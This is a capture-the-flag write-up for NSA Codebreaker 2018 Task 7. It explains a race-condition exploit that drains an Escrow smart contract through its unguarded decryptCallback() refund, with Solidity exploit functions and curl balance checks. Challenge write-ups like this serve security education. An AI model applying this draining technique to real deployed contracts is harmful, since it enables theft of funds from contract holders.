---
title: "NSA Codebreaker 2018 Task 7"
author: "Andrew Quach"
date: 2019-01-16T00:00:00-07:00
categories: ['Writeups']
tags: ['codebreaker']
caption: ""

draft: false
---

**Refunds – (Smart-Contract Development; Vulnerability Analysis; Exploit Development)**

Task 7 has us refund the victims who have already paid the ransom. In other words, we need to recover all the funds in the Escrow contract, then transfer the funds to the victims. Recall that from [task 6](https://www.osusec.org/nsa-codebreaker-2018-task-6/), we found that we could deploy and authenticate arbitrary ransom contracts.

#### Scanning for Vulnerabilities

A natural place we can start looking for a vulnerability is the **requestRefund()** function.

```
function requestRefund(uint id, uint amount) external restrictSenderToVictim(id) returns (bool) {
    address payer = vicToPayerMap[id];
    if (payer > 0 && escrowMap[id] >= amount && amount > 0) {
        escrowMap[id] -= amount;
        payer.transfer(amount);
        return true;
    }
    return false;
}
```

The victims can retrieve unused funds paid into the Escrow contract using **requestRefund()**. However, this function seems difficult to exploit as **escrowMap\[id]** only gets increased when ether is paid into the contract. Getting an arbitrary amount past the **escrowMap\[id] >= amount** guard would prove to be rough. So, perhaps there is another **transfer()** call that is easier to exploit.

```
function decryptCallback(uint id, bytes32 decKey, bool authResult) external restrictSenderToOracle {
    require(bytes(encFileMap[id]).length != 0, "missing encrypted file");
    delete encFileMap[id]; // no longer needed

    decKeyMap[id] = decKey;
    emit DecryptCallbackEvent(id, authResult);

    Victim storage vicInfo = victimMap[id];
    escrowMap[id] -= vicInfo.ransomAmount;

    if (authResult) {
        ownerBalance += vicInfo.ransomAmount;
        Ransom(vicInfo.ransomAddr).fulfillContract();
    } else {
        vicToPayerMap[id].transfer(vicInfo.ransomAmount); 
    } 
```

A few lines down, we see that the **decryptCallback()** function also transfers funds to the victim. This time, there is no guard. It just refunds the Ransom contract’s ransom amount to the victim upon decryption failure. Fortunately for us, we can control anything in the Ransom contract. If we make a fake Ransom contract with the ransom amount equal to all the funds in the Escrow contract (300 ether + 10 wei), we completely drain the Escrow contract.

![Diagram of the Escrow Contract](/blog/nsa-codebreaker-2018-task-7-escrow-contract.png)

Recall from task 6, we learned how the decryption process functions. We need the oracle to call **decryptCallback()** with our fake Ransom contract in place. But to do so, we need to execute **payRansom()**. And to execute **payRansom()** without paying, we need the ransom amount to be zero. How can we have the ransom amount be both 0 ether and 300 ether?

#### Race Condition

Ideally, the ransom amount would be 0 ether at **payRansom()** and 300 ether at **decryptCallback()**. To set up this situation, we can abuse the fact that the oracle is off-chain and slow. We can

1. Set up a ransom contract with no ransom.
2. Call **payRansom()**.
3. Call **decryptKey()**.
4. Reinitialize the ransom contract to have a 300 ether ransom.
5. Let the oracle run **decryptCallback()**.
6. Profit!

#### Clarifying Questions

There are a few questions about this exploit that arise.

**Q:** First, why do we need to call **payRansom()** if we can just call **decryptKey()** directly?
**A:** The **DecryptEvent** requires **encFileMap\[id]** which is only set in **payRansom()**. This may not be necessary since we want the **DecryptEvent** to fail anyway, but I didn’t risk it. Either way, it doesn’t add much more work.

**Q:** Second, why do we need to race the **DecryptEvent**? Can’t we swap steps 3 and 4?
**A:** The **decryptKey()** call has the **hasPaidRansom(id)** modifier, defined by (**escrowMap\[id] >= victimMap\[id].ransomAmount**). Since we did not pay anything, we need the ransom amount to still be zero at this point. 

#### Draining the Escrow Contract

We can set up a withdraw function following the described steps.

```
function withdrawl() external {
    // Set encrypted file
    Escrow(escrowAddr).payRansom(victimId, "dummy value");
    // Call decrypt event
    Escrow(escrowAddr).decryptKey(victimId, "dummy key");
    // Race decrypt event
    modifyRansom(300000000000000000010 wei);
}
```

The call to **modifyRansom()** simply re-registers the ransom with the same victim ID and address but a different ransom amount. We register the ransom with **victimAddr = address(this)** to bypass the **restrictSenderToVictim(id)** modifier in **payRansom()**.

```
function modifyRansom(uint newRansomAmount) internal {
    Escrow(escrowAddr).registerRansom(newRansomAmount, victimId, victimAddr);
}
```

We have **requestKey()** do nothing, keeping it there only so **payRansom()** does not error.

```
function requestKey() external view onlyAuthenticated {
}
```

Lastly, we set up a payable fallback function to receive the payments.

```
function () payable public {
}
```

And with that, upon authenticating our RefundRansom contract and calling our newly created **withdrawl()** function, we recover all the funds in the Escrow contract.

#### Refunding the Victims

To refund we the victims, we just need to add a way to transfer the funds from our RefundRansom contract.

```
function sendPayment(address addr, uint amount) external {
    addr.transfer(amount);
}
```

Although this could do with better permission modifiers, the function does its job.

After manually refunding the three victims who paid the ransom, we can check to see if everything worked as expected.

```
curl -X POST --data '{"jsonrpc":"2.0","method":"eth_getBalance","params":["0xe160365793baef0d971765be8180275f9fea2b3d", "latest"],"id":1}' -H "Content-Type: application/json" $URL

Beforehand: 0x15acbdd634f769000 = 24989310376000000000
Afterwards: 0x6c6933b90b2869000 = 124989310376000000000

curl -X POST --data '{"jsonrpc":"2.0","method":"eth_getBalance","params":["0x139f8f562dadc241e42744c99ef803381f3e1d08", "latest"],"id":1}' -H "Content-Type: application/json" $URL
Beforehand: 0x15acbdd634f769000 = 24989310376000000000
Afterwards: 0x6c6933b90b2869000 = 124989310376000000000

curl -X POST --data '{"jsonrpc":"2.0","method":"eth_getBalance","params":["0x6c8e1acf3e73f2a0a03dbfc8f1a14269677b7ac5", "latest"],"id":1}' -H "Content-Type: application/json" $URL
Beforehand: 0x15acbdd634f769000 = 24989310376000000000
Afterwards: 0x6c6933b90b2869000 = 124989310376000000000
```

All the victims have indeed received the ether that is rightfully theirs!

[Here is the full RefundRansom contract.](https://gist.github.com/Aqcurate/d6c6fd6087ef73aaa10449641d48b795)

#### Submission Details

**Escrow Address:** 0x147c5B6fBdE084D96c4b3BfAb72f208E78bae6b8

![Screenshot of Task 7 on NSA Codebreaker Challenge website complete](/blog/nsa-codebreaker-2018-task-7-finished.png)
